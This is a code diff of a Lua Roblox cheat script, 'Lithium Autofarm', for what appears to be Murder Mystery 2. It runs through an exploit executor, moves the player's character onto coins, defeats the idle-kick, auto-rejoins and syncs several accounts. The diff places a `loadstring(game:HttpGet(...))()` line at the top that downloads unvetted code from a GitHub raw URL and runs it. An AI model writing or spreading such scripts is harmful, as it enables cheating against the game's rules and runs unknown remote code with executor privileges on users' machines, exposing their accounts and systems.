@@ -5,94 +5,89 @@ if getgenv().Loaded then return end
 if game.PlaceId ~= 142823291 then return end
 getgenv().Loaded = true
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseGaming420/MM2/refs/heads/main/MM2"))()
+
 local Player = game.Players.LocalPlayer
 local RS = game:GetService("ReplicatedStorage")
 local Gameplay = RS.Remotes.Gameplay
 local HttpService = game:GetService("HttpService")
 local UIS = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
 
 local CONFIG_FILE = "mm2_autofarm_config.json"
 
 local function loadConfig()
-    local default = {
-        Enabled = true,
-        ResetOnBagFull = true,
-        Speed = 26,
-        AntiAFK = true,
-        AutoRejoin = true,
-        Rendering = false,
-        MaxFPS = 20
-    }
-    if not isfile or not isfile(CONFIG_FILE) then return default end
-    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(CONFIG_FILE)) end)
-    if not ok or type(data) ~= "table" then return default end
-    for k,v in pairs(default) do if data[k] == nil then data[k] = v end end
+    local d={Enabled=true,ResetOnBagFull=true,Speed=26,AntiAFK=true,AutoRejoin=true,Rendering=false,MaxFPS=20}
+    if not isfile or not isfile(CONFIG_FILE) then return d end
+    local ok,data=pcall(function()return HttpService:JSONDecode(readfile(CONFIG_FILE))end)
+    if not ok or type(data)~="table" then return d end
+    for k,v in pairs(d) do if data[k]==nil then data[k]=v end end
     return data
 end
 
-local function saveConfig(tbl)
+local function saveConfig(t)
     if writefile then
-        local ok, encoded = pcall(function() return HttpService:JSONEncode(tbl) end)
-        if ok then writefile(CONFIG_FILE, encoded) end
+        local ok,e=pcall(function()return HttpService:JSONEncode(t)end)
+        if ok then writefile(CONFIG_FILE,e) end
     end
 end
 
-local Settings = loadConfig()
+local Settings=loadConfig()
 
-local SETTINGS_SYNC_FILE = "mm2_settings_sync.json"
-if not isfile(SETTINGS_SYNC_FILE) then writefile(SETTINGS_SYNC_FILE, HttpService:JSONEncode(Settings)) end
+local SETTINGS_SYNC_FILE="mm2_settings_sync.json"
+if not isfile(SETTINGS_SYNC_FILE) then writefile(SETTINGS_SYNC_FILE,HttpService:JSONEncode(Settings)) end
 
 local function readGlobalSettings()
-    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(SETTINGS_SYNC_FILE)) end)
+    local ok,data=pcall(function()return HttpService:JSONDecode(readfile(SETTINGS_SYNC_FILE))end)
     return ok and data or Settings
 end
 
 local function writeGlobalSettings()
-    writefile(SETTINGS_SYNC_FILE, HttpService:JSONEncode(Settings))
+    writefile(SETTINGS_SYNC_FILE,HttpService:JSONEncode(Settings))
 end
 
 local function applyGlobalSettings()
-    local global = readGlobalSettings()
-    for k,v in pairs(global) do Settings[k] = v end
-    game:GetService("RunService"):Set3dRenderingEnabled(Settings.Rendering)
+    local g=readGlobalSettings()
+    for k,v in pairs(g) do Settings[k]=v end
+    RunService:Set3dRenderingEnabled(Settings.Rendering)
     if setfpscap then setfpscap(Settings.MaxFPS) end
 end
 
-local SYNC_FILE = "mm2_sync.json"
-if not isfile(SYNC_FILE) then writefile(SYNC_FILE, "{}") end
+local SYNC_FILE="mm2_sync.json"
+if not isfile(SYNC_FILE) then writefile(SYNC_FILE,"{}") end
 
 local function readSync()
-    local ok, data = pcall(function() return HttpService:JSONDecode(readfile(SYNC_FILE)) end)
+    local ok,data=pcall(function()return HttpService:JSONDecode(readfile(SYNC_FILE))end)
     return ok and data or {}
 end
 
-local function writeSync(data)
-    writefile(SYNC_FILE, HttpService:JSONEncode(data))
+local function writeSync(d)
+    writefile(SYNC_FILE,HttpService:JSONEncode(d))
 end
 
 local function markPresent()
-    local data = readSync()
-    data[Player.Name] = data[Player.Name] or {}
-    data[Player.Name].present = true
-    data[Player.Name].bagFull = false
-    writeSync(data)
+    local d=readSync()
+    d[Player.Name]=d[Player.Name]or{}
+    d[Player.Name].present=true
+    d[Player.Name].bagFull=false
+    writeSync(d)
 end
 
-local function updateBagStatus(isFull)
-    local data = readSync()
-    data[Player.Name] = data[Player.Name] or {}
-    data[Player.Name].present = true
-    data[Player.Name].bagFull = isFull
-    writeSync(data)
+local function updateBagStatus(b)
+    local d=readSync()
+    d[Player.Name]=d[Player.Name]or{}
+    d[Player.Name].present=true
+    d[Player.Name].bagFull=b
+    writeSync(d)
 end
 
 local function allAccountsFull()
-    local data = readSync()
-    local any = false
-    for _,info in pairs(data) do
-        if info.present then
-            any = true
-            if not info.bagFull then return false end
+    local d=readSync()
+    local any=false
+    for _,i in pairs(d) do
+        if i.present then
+            any=true
+            if not i.bagFull then return false end
         end
     end
     return any
@@ -100,191 +95,195 @@ end
 
 markPresent()
 
+local EnabledButton,ResetButton,AntiAFKButton,AutoRejoinButton,RenderingButton
+local SpeedLabel,FPSLabel
+
 local function CreateUI()
-    local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.ResetOnSpawn = false
-    ScreenGui.Parent = Player:WaitForChild("PlayerGui")
+    local g=Instance.new("ScreenGui")
+    g.ResetOnSpawn=false
+    g.Parent=Player:WaitForChild("PlayerGui")
 
-    local Frame = Instance.new("Frame")
-    Frame.Size = UDim2.new(0,300,0,420)
-    Frame.Position = UDim2.new(0,20,0,200)
-    Frame.BackgroundColor3 = Color3.fromRGB(28,28,28)
-    Frame.Parent = ScreenGui
-    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0,12)
+    local f=Instance.new("Frame")
+    f.Size=UDim2.new(0,300,0,420)
+    f.Position=UDim2.new(0,20,0,200)
+    f.BackgroundColor3=Color3.fromRGB(28,28,28)
+    f.Parent=g
+    Instance.new("UICorner",f).CornerRadius=UDim.new(0,12)
 
-    local Header = Instance.new("Frame")
-    Header.Size = UDim2.new(1,0,0,40)
-    Header.BackgroundColor3 = Color3.fromRGB(35,35,35)
-    Header.Parent = Frame
-    Instance.new("UICorner", Header).CornerRadius = UDim.new(0,12)
+    local h=Instance.new("Frame")
+    h.Size=UDim2.new(1,0,0,40)
+    h.BackgroundColor3=Color3.fromRGB(35,35,35)
+    h.Parent=f
+    Instance.new("UICorner",h).CornerRadius=UDim.new(0,12)
 
-    local Title = Instance.new("TextLabel")
-    Title.Size = UDim2.new(1,0,1,0)
-    Title.BackgroundTransparency = 1
-    Title.Text = "Lithium Autofarm"
-    Title.TextColor3 = Color3.fromRGB(255,255,255)
-    Title.Font = Enum.Font.GothamBold
-    Title.TextSize = 18
-    Title.Parent = Header
+    local t=Instance.new("TextLabel")
+    t.Size=UDim2.new(1,0,1,0)
+    t.BackgroundTransparency=1
+    t.Text="Lithium Autofarm"
+    t.TextColor3=Color3.fromRGB(255,255,255)
+    t.Font=Enum.Font.GothamBold
+    t.TextSize=18
+    t.Parent=h
 
-    local dragging, dragStart, startPos
+    local drag=false
+    local dragStart,startPos
 
-    Header.InputBegan:Connect(function(i)
-        if i.UserInputType == Enum.UserInputType.MouseButton1 then
-            dragging = true
-            dragStart = i.Position
-            startPos = Frame.Position
+    h.InputBegan:Connect(function(i)
+        if i.UserInputType==Enum.UserInputType.MouseButton1 then
+            drag=true
+            dragStart=i.Position
+            startPos=f.Position
         end
     end)
 
-    Header.InputEnded:Connect(function(i)
-        if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
+    h.InputEnded:Connect(function(i)
+        if i.UserInputType==Enum.UserInputType.MouseButton1 then drag=false end
     end)
 
     UIS.InputChanged:Connect(function(i)
-        if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
-            local delta = i.Position - dragStart
-            Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        if drag and i.UserInputType==Enum.UserInputType.MouseMovement then
+            local d=i.Position-dragStart
+            f.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y)
         end
     end)
 
-    local Scroll = Instance.new("ScrollingFrame")
-    Scroll.Size = UDim2.new(1,0,1,-40)
-    Scroll.Position = UDim2.new(0,0,0,40)
-    Scroll.CanvasSize = UDim2.new(0,0,0,0)
-    Scroll.ScrollBarThickness = 6
-    Scroll.BackgroundTransparency = 1
-    Scroll.Parent = Frame
+    local s=Instance.new("ScrollingFrame")
+    s.Size=UDim2.new(1,0,1,-40)
+    s.Position=UDim2.new(0,0,0,40)
+    s.CanvasSize=UDim2.new(0,0,0,0)
+    s.ScrollBarThickness=6
+    s.BackgroundTransparency=1
+    s.Parent=f
 
-    local Layout = Instance.new("UIListLayout")
-    Layout.Padding = UDim.new(0,10)
-    Layout.Parent = Scroll
+    local l=Instance.new("UIListLayout")
+    l.Padding=UDim.new(0,10)
+    l.Parent=s
 
-    local Padding = Instance.new("UIPadding")
-    Padding.PaddingTop = UDim.new(0,10)
-    Padding.PaddingLeft = UDim.new(0,10)
-    Padding.PaddingRight = UDim.new(0,10)
-    Padding.Parent = Scroll
+    local p=Instance.new("UIPadding")
+    p.PaddingTop=UDim.new(0,10)
+    p.PaddingLeft=UDim.new(0,10)
+    p.PaddingRight=UDim.new(0,10)
+    p.Parent=s
 
-    Layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-        Scroll.CanvasSize = UDim2.new(0,0,0,Layout.AbsoluteContentSize.Y + 20)
+    l:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+        s.CanvasSize=UDim2.new(0,0,0,l.AbsoluteContentSize.Y+20)
     end)
 
-    game:GetService("RunService").Heartbeat:Connect(function()
-        Scroll.CanvasSize = UDim2.new(0,0,0,Layout.AbsoluteContentSize.Y + 20)
+    RunService.Heartbeat:Connect(function()
+        s.CanvasSize=UDim2.new(0,0,0,l.AbsoluteContentSize.Y+20)
     end)
 
-    local UI = {}
+    local UI={}
 
-    function UI:Section(text)
-        local Label = Instance.new("TextLabel")
-        Label.Size = UDim2.new(1,0,0,24)
-        Label.BackgroundTransparency = 1
-        Label.Text = text
-        Label.TextColor3 = Color3.fromRGB(200,200,200)
-        Label.Font = Enum.Font.GothamBold
-        Label.TextSize = 14
-        Label.Parent = Scroll
+    function UI:Section(txt)
+        local x=Instance.new("TextLabel")
+        x.Size=UDim2.new(1,0,0,24)
+        x.BackgroundTransparency=1
+        x.Text=txt
+        x.TextColor3=Color3.fromRGB(200,200,200)
+        x.Font=Enum.Font.GothamBold
+        x.TextSize=14
+        x.Parent=s
     end
 
-    function UI:Toggle(name, default, callback)
-        local Btn = Instance.new("TextButton")
-        Btn.Size = UDim2.new(1,0,0,32)
-        Btn.BackgroundColor3 = Color3.fromRGB(45,45,45)
-        Btn.TextColor3 = Color3.fromRGB(255,255,255)
-        Btn.Text = name .. ": " .. (default and "ON" or "OFF")
-        Btn.Font = Enum.Font.Gotham
-        Btn.TextSize = 14
-        Btn.Parent = Scroll
-        Instance.new("UICorner", Btn).CornerRadius = UDim.new(0,8)
-        Btn.MouseButton1Click:Connect(function()
-            default = not default
-            Btn.Text = name .. ": " .. (default and "ON" or "OFF")
-            callback(default)
+    function UI:Toggle(name,default,cb)
+        local b=Instance.new("TextButton")
+        b.Size=UDim2.new(1,0,0,32)
+        b.BackgroundColor3=Color3.fromRGB(45,45,45)
+        b.TextColor3=Color3.fromRGB(255,255,255)
+        b.Text=name..": "..(default and"ON"or"OFF")
+        b.Font=Enum.Font.Gotham
+        b.TextSize=14
+        b.Parent=s
+        Instance.new("UICorner",b).CornerRadius=UDim.new(0,8)
+        b.MouseButton1Click:Connect(function()
+            default=not default
+            b.Text=name..": "..(default and"ON"or"OFF")
+            cb(default)
             saveConfig(Settings)
             writeGlobalSettings()
         end)
+        return b
     end
 
-    function UI:Slider(name, min, max, default, callback)
-        local Holder = Instance.new("Frame")
-        Holder.Size = UDim2.new(1,0,0,40)
-        Holder.BackgroundTransparency = 1
-        Holder.Parent = Scroll
+    function UI:Slider(name,min,max,default,cb)
+        local h=Instance.new("Frame")
+        h.Size=UDim2.new(1,0,0,40)
+        h.BackgroundTransparency=1
+        h.Parent=s
 
-        local Label = Instance.new("TextLabel")
-        Label.Size = UDim2.new(1,0,0,18)
-        Label.BackgroundTransparency = 1
-        Label.Text = name .. ": " .. default
-        Label.TextColor3 = Color3.fromRGB(255,255,255)
-        Label.Font = Enum.Font.Gotham
-        Label.TextSize = 14
-        Label.Parent = Holder
+        local l2=Instance.new("TextLabel")
+        l2.Size=UDim2.new(1,0,0,18)
+        l2.BackgroundTransparency=1
+        l2.Text=name..": "..default
+        l2.TextColor3=Color3.fromRGB(255,255,255)
+        l2.Font=Enum.Font.Gotham
+        l2.TextSize=14
+        l2.Parent=h
 
-        local Bar = Instance.new("Frame")
-        Bar.Size = UDim2.new(1,0,0,14)
-        Bar.Position = UDim2.new(0,0,0,22)
-        Bar.BackgroundColor3 = Color3.fromRGB(50,50,50)
-        Bar.Parent = Holder
-        Instance.new("UICorner", Bar).CornerRadius = UDim.new(0,6)
+        local bar=Instance.new("Frame")
+        bar.Size=UDim2.new(1,0,0,14)
+        bar.Position=UDim2.new(0,0,0,22)
+        bar.BackgroundColor3=Color3.fromRGB(50,50,50)
+        bar.Parent=h
+        Instance.new("UICorner",bar).CornerRadius=UDim.new(0,6)
 
-        local Fill = Instance.new("Frame")
-        Fill.Size = UDim2.new((default-min)/(max-min),0,1,0)
-        Fill.BackgroundColor3 = Color3.fromRGB(255,80,80)
-        Fill.Parent = Bar
-        Instance.new("UICorner", Fill).CornerRadius = UDim.new(0,6)
+        local fill=Instance.new("Frame")
+        fill.Size=UDim2.new((default-min)/(max-min),0,1,0)
+        fill.BackgroundColor3=Color3.fromRGB(255,80,80)
+        fill.Parent=bar
+        Instance.new("UICorner",fill).CornerRadius=UDim.new(0,6)
 
-        local dragging = false
+        local dragging=false
 
-        Bar.InputBegan:Connect(function(i)
-            if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true end
+        bar.InputBegan:Connect(function(i)
+            if i.UserInputType==Enum.UserInputType.MouseButton1 then dragging=true end
         end)
 
         UIS.InputEnded:Connect(function(i)
-            if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
+            if i.UserInputType==Enum.UserInputType.MouseButton1 then dragging=false end
         end)
 
-        game:GetService("RunService").RenderStepped:Connect(function()
+        RunService.RenderStepped:Connect(function()
             if dragging then
-                local mouse = UIS:GetMouseLocation().X
-                local pos = math.clamp(mouse - Bar.AbsolutePosition.X, 0, Bar.AbsoluteSize.X)
-                local value = math.floor(min + (pos / Bar.AbsoluteSize.X) * (max - min))
-                Fill.Size = UDim2.new(pos / Bar.AbsoluteSize.X, 0, 1, 0)
-                Label.Text = name .. ": " .. value
-                callback(value)
+                local m=UIS:GetMouseLocation().X
+                local pos=math.clamp(m-bar.AbsolutePosition.X,0,bar.AbsoluteSize.X)
+                local val=math.floor(min+(pos/bar.AbsoluteSize.X)*(max-min))
+                fill.Size=UDim2.new(pos/bar.AbsoluteSize.X,0,1,0)
+                l2.Text=name..": "..val
+                cb(val)
                 saveConfig(Settings)
                 writeGlobalSettings()
             end
         end)
+
+        return l2
     end
 
     return UI
 end
 
-local UI = CreateUI()
+local UI=CreateUI()
 
 UI:Section("Autofarm")
-UI:Toggle("Enabled", Settings.Enabled, function(v) Settings.Enabled = v writeGlobalSettings() end)
-UI:Toggle("Reset On Bag Full", Settings.ResetOnBagFull, function(v) Settings.ResetOnBagFull = v writeGlobalSettings() end)
+EnabledButton=UI:Toggle("Enabled",Settings.Enabled,function(v)Settings.Enabled=v writeGlobalSettings()end)
+ResetButton=UI:Toggle("Reset On Bag Full",Settings.ResetOnBagFull,function(v)Settings.ResetOnBagFull=v writeGlobalSettings()end)
 
 UI:Section("Misc")
-UI:Toggle("Anti-AFK", Settings.AntiAFK, function(v) Settings.AntiAFK = v writeGlobalSettings() end)
-UI:Toggle("Auto Rejoin", Settings.AutoRejoin, function(v) Settings.AutoRejoin = v writeGlobalSettings() end)
-UI:Toggle("Rendering", Settings.Rendering, function(v) Settings.Rendering = v game:GetService("RunService"):Set3dRenderingEnabled(v) writeGlobalSettings() end)
+AntiAFKButton=UI:Toggle("Anti-AFK",Settings.AntiAFK,function(v)Settings.AntiAFK=v writeGlobalSettings()end)
+AutoRejoinButton=UI:Toggle("Auto Rejoin",Settings.AutoRejoin,function(v)Settings.AutoRejoin=v writeGlobalSettings()end)
+RenderingButton=UI:Toggle("Rendering",Settings.Rendering,function(v)Settings.Rendering=v RunService:Set3dRenderingEnabled(v) writeGlobalSettings()end)
 
 UI:Section("Sliders")
-UI:Slider("Speed", 8, 50, Settings.Speed, function(v) Settings.Speed = v writeGlobalSettings() end)
-UI:Slider("Max FPS", 10, 240, Settings.MaxFPS, function(v) Settings.MaxFPS = v if setfpscap then setfpscap(v) end writeGlobalSettings() end)
+SpeedLabel=UI:Slider("Speed",8,50,Settings.Speed,function(v)Settings.Speed=v writeGlobalSettings()end)
+FPSLabel=UI:Slider("Max FPS",10,240,Settings.MaxFPS,function(v)Settings.MaxFPS=v if setfpscap then setfpscap(v) end writeGlobalSettings()end)
 
 UI:Section("Group Actions")
-UI:Toggle("RESET GROUP NOW", false, function(v)
+UI:Toggle("RESET GROUP NOW",false,function(v)
     if v then
-        local data = readSync()
-        for _,info in pairs(data) do
-            info.present = true
-            info.bagFull = true
-        end
-        writeSync(data)
+        local d=readSync()
+        for _,i in pairs(d) do i.present=true i.bagFull=true end
+        writeSync(d)
     end
 end)
 
@@ -292,64 +291,70 @@ task.spawn(function()
     while true do
         task.wait(2)
         applyGlobalSettings()
+        local g=readGlobalSettings()
+        EnabledButton.Text="Enabled: "..(g.Enabled and"ON"or"OFF")
+        ResetButton.Text="Reset On Bag Full: "..(g.ResetOnBagFull and"ON"or"OFF")
+        AntiAFKButton.Text="Anti-AFK: "..(g.AntiAFK and"ON"or"OFF")
+        AutoRejoinButton.Text="Auto Rejoin: "..(g.AutoRejoin and"ON"or"OFF")
+        RenderingButton.Text="Rendering: "..(g.Rendering and"ON"or"OFF")
+        SpeedLabel.Text="Speed: "..g.Speed
+        FPSLabel.Text="Max FPS: "..g.MaxFPS
     end
 end)
 
 task.spawn(function()
     while true do
         task.wait(2)
-        if allAccountsFull() and Settings.Enabled then
-            if Farm then Farm:Reset() end
+        if allAccountsFull() and Settings.Enabled and _G.Farm then
+            _G.Farm:Reset()
         end
     end
 end)
+local AutoFarm={}
+AutoFarm.__index=AutoFarm
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseGaming420/MM2/refs/heads/main/MM2"))()
-local AutoFarm = {}
-AutoFarm.__index = AutoFarm
-
-function AutoFarm.New(plr)
+function AutoFarm.New(p)
     return setmetatable({
-        Player = plr,
-        BagFull = false,
-        RoundActive = false,
-        IsElite = false,
-        BagCap = 40,
-        CurrentTween = nil,
-        Respawning = false,
-        DiedThisRound = false
-    }, AutoFarm)
+        Player=p,
+        BagFull=false,
+        RoundActive=false,
+        IsElite=false,
+        BagCap=40,
+        CurrentTween=nil,
+        Respawning=false,
+        DiedThisRound=false
+    },AutoFarm)
 end
 
-local function Char(self) return self.Player.Character end
-local function HRP(self) local c=Char(self) return c and c:FindFirstChild("HumanoidRootPart") end
-local function Hum(self) local c=Char(self) return c and c:FindFirstChildWhichIsA("Humanoid") end
+local function Char(self)return self.Player.Character end
+local function HRP(self)local c=Char(self)return c and c:FindFirstChild("HumanoidRootPart")end
+local function Hum(self)local c=Char(self)return c and c:FindFirstChildWhichIsA("Humanoid")end
 
 function AutoFarm:CancelTween()
-    if self.CurrentTween then self.CurrentTween:Cancel() self.CurrentTween = nil end
+    if self.CurrentTween then self.CurrentTween:Cancel() self.CurrentTween=nil end
 end
 
 function AutoFarm:Reset()
     if self.Respawning then return end
-    self.Respawning = true
-    self.BagFull = false
-    self.DiedThisRound = true
+    self.Respawning=true
+    self.BagFull=false
+    self.DiedThisRound=true
     self:CancelTween()
-    local h = Hum(self)
-    if h then h:ChangeState(Enum.HumanoidStateType.Dead) else local c=Char(self) if c then c:BreakJoints() end end
+    local h=Hum(self)
+    if h then h:ChangeState(Enum.HumanoidStateType.Dead) else local c=Char(self)if c then c:BreakJoints()end end
     task.spawn(function()
-        local newChar = self.Player.CharacterAdded:Wait()
-        if newChar then self.Respawning = false updateBagStatus(false) end
+        local new=self.Player.CharacterAdded:Wait()
+        if new then self.Respawning=false updateBagStatus(false) end
     end)
 end
 
 function AutoFarm:DetectCoins()
     Gameplay.CoinCollected.OnClientEvent:Connect(function(t,cur,cap)
-        if t~="Coin" or type(cur)~="number" or type(cap)~="number" then return end
-        if self.BagCap ~= cap then self.BagCap = cap self.IsElite = cap > 40 end
+        if t~="Coin"or type(cur)~="number"or type(cap)~="number"then return end
+        if self.BagCap~=cap then self.BagCap=cap self.IsElite=cap>40 end
         if not self.RoundActive or self.BagFull or self.Respawning or self.DiedThisRound then return end
-        if cur >= cap then
-            self.BagFull = true
+        if cur>=cap then
+            self.BagFull=true
             updateBagStatus(true)
             if Settings.ResetOnBagFull and Settings.Enabled then
                 if allAccountsFull() then self:Reset() end
@@ -359,41 +364,41 @@ function AutoFarm:DetectCoins()
 end
 
 function AutoFarm:DetectRounds()
-    local CRC = require(RS.Modules.CurrentRoundClient)
-    local MyData = CRC.PlayerData and CRC.PlayerData[self.Player.Name]
-    if MyData then self.RoundActive = true self.DiedThisRound = MyData.Dead == true end
+    local CRC=require(RS.Modules.CurrentRoundClient)
+    local d=CRC.PlayerData and CRC.PlayerData[self.Player.Name]
+    if d then self.RoundActive=true self.DiedThisRound=d.Dead==true end
 
     Gameplay.RoundStart.OnClientEvent:Connect(function()
-        self.RoundActive = true
-        self.BagFull = false
-        self.Respawning = false
-        self.DiedThisRound = false
+        self.RoundActive=true
+        self.BagFull=false
+        self.Respawning=false
+        self.DiedThisRound=false
         updateBagStatus(false)
     end)
 
     Gameplay.VictoryScreen.OnClientEvent:Connect(function()
-        self.RoundActive = false
-        self.BagFull = false
+        self.RoundActive=false
+        self.BagFull=false
         self:CancelTween()
         updateBagStatus(false)
     end)
 
     Gameplay.RoundEndFade.OnClientEvent:Connect(function()
         if self.RoundActive then
-            self.RoundActive = false
-            self.BagFull = false
+            self.RoundActive=false
+            self.BagFull=false
             self:CancelTween()
             updateBagStatus(false)
         end
     end)
 
     CRC.PlayerDataChanged.Event:Connect(function()
-        local Data = CRC.GetLatestPlayerData()
-        local empty = true
-        for _ in pairs(Data) do empty = false break end
+        local d2=CRC.GetLatestPlayerData()
+        local empty=true
+        for _ in pairs(d2)do empty=false break end
         if empty then
-            self.RoundActive = false
-            self.BagFull = false
+            self.RoundActive=false
+            self.BagFull=false
             self:CancelTween()
             updateBagStatus(false)
         end
@@ -401,32 +406,32 @@ function AutoFarm:DetectRounds()
 end
 
 function AutoFarm:GetNearestCoin()
-    local root = HRP(self)
-    if not root then return nil end
-    local closest, dist = nil, math.huge
-    for _,obj in pairs(workspace:GetChildren()) do
-        local cont = obj:FindFirstChild("CoinContainer")
-        if cont then
-            for _,coin in pairs(cont:GetChildren()) do
-                if coin:GetAttribute("CoinID")=="Coin" and coin:FindFirstChild("TouchInterest") then
-                    local d = (root.Position - coin.Position).Magnitude
-                    if d < dist then closest = coin dist = d end
+    local r=HRP(self)
+    if not r then return nil end
+    local closest,dist=nil,math.huge
+    for _,o in pairs(workspace:GetChildren())do
+        local c=o:FindFirstChild("CoinContainer")
+        if c then
+            for _,coin in pairs(c:GetChildren())do
+                if coin:GetAttribute("CoinID")=="Coin"and coin:FindFirstChild("TouchInterest")then
+                    local d=(r.Position-coin.Position).Magnitude
+                    if d<dist then closest=coin dist=d end
                 end
             end
         end
     end
-    return closest, dist
+    return closest,dist
 end
 
-function AutoFarm:TweenTo(cf, dist)
-    local root = HRP(self)
-    local hum = Hum(self)
-    if not root or not hum then return end
+function AutoFarm:TweenTo(cf,dist)
+    local r=HRP(self)
+    local h=Hum(self)
+    if not r or not h then return end
     self:CancelTween()
-    local target = CFrame.new(cf.Position.X, cf.Position.Y + hum.HipHeight, cf.Position.Z)
-    local tween = game:GetService("TweenService"):Create(root, TweenInfo.new(dist / Settings.Speed, Enum.EasingStyle.Linear), {CFrame = target})
-    self.CurrentTween = tween
-    tween:Play()
+    local target=CFrame.new(cf.Position.X,cf.Position.Y+h.HipHeight,cf.Position.Z)
+    local tw=game:GetService("TweenService"):Create(r,TweenInfo.new(dist/Settings.Speed,Enum.EasingStyle.Linear),{CFrame=target})
+    self.CurrentTween=tw
+    tw:Play()
 end
 
 function AutoFarm:Start()
@@ -434,15 +439,15 @@ function AutoFarm:Start()
         while true do
             task.wait()
             if not Settings.Enabled or not self.RoundActive or self.BagFull or self.Respawning or self.DiedThisRound then continue end
-            local root = HRP(self)
-            if not root then continue end
-            local coin, dist = self:GetNearestCoin()
+            local r=HRP(self)
+            if not r then continue end
+            local coin,dist=self:GetNearestCoin()
             if coin then
-                if dist > 150 then
-                    root.CFrame = coin.CFrame
+                if dist>150 then
+                    r.CFrame=coin.CFrame
                 else
-                    self:TweenTo(coin.CFrame, dist)
-                    repeat task.wait() until not coin:FindFirstChild("TouchInterest") or not self.RoundActive or self.BagFull or self.Respawning or self.DiedThisRound
+                    self:TweenTo(coin.CFrame,dist)
+                    repeat task.wait() until not coin:FindFirstChild("TouchInterest")or not self.RoundActive or self.BagFull or self.Respawning or self.DiedThisRound
                     self:CancelTween()
                 end
             else
@@ -451,3 +456,35 @@ function AutoFarm:Start()
         end
     end)
 end
+
+if Settings.AutoRejoin then
+    local GuiService=game:GetService("GuiService")
+    local TeleportService=game:GetService("TeleportService")
+    GuiService.ErrorMessageChanged:Connect(function(msg)
+        if msg and msg~="" then
+            task.wait()
+            TeleportService:Teleport(game.PlaceId,Player)
+        end
+    end)
+end
+
+if Settings.AntiAFK then
+    if getconnections then
+        for _,c in pairs(getconnections(Player.Idled))do
+            if c.Disable then c:Disable() elseif c.Disconnect then c:Disconnect() end
+        end
+    else
+        Player.Idled:Connect(function()
+            local vu=game:GetService("VirtualUser")
+            vu:CaptureController()
+            vu:ClickButton2(Vector2.new())
+        end)
+    end
+end
+
+_G.Farm=AutoFarm.New(Player)
+_G.Farm:DetectCoins()
+_G.Farm:DetectRounds()
+_G.Farm:Start()
+
+print("Loaded")
